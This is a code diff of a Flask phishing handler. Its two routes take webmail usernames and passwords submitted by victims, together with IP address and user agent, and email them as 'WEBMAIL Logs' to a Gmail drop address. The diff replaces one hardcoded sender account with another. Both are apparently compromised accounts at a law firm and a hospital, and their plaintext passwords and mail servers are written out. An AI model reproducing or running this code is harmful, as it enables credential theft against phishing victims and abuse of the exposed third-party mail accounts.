@@ -145,10 +145,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "rodrigo@brasildematos.adv.br"
-        sender_emaill = "rodrigo"
+        sender_email = "insurance@hamshospital.com"
+        sender_emaill = "insurance@hamshospital.com"
         receiver_email = "godbwithus20@gmail.com"
-        password = "Nicol@u1"
+        password = "hams@insurance123"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "WEBMAIL Logs !"
@@ -164,7 +164,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.brasildematos.adv.br", 465) as server:
+        with smtplib.SMTP_SSL("mail.hamshospital.com", 587) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -183,10 +183,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "rodrigo@brasildematos.adv.br"
-        sender_emaill = "rodrigo"
+        sender_email = "insurance@hamshospital.com"
+        sender_emaill = "insurance@hamshospital.com"
         receiver_email = "godbwithus20@gmail.com"
-        password = "Nicol@u1"
+        password = "hams@insurance123"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "WEBMAIL logs !! "
@@ -202,7 +202,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.brasildematos.adv.br", 465) as server:
+        with smtplib.SMTP_SSL("mail.hamshospital.com", 587) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
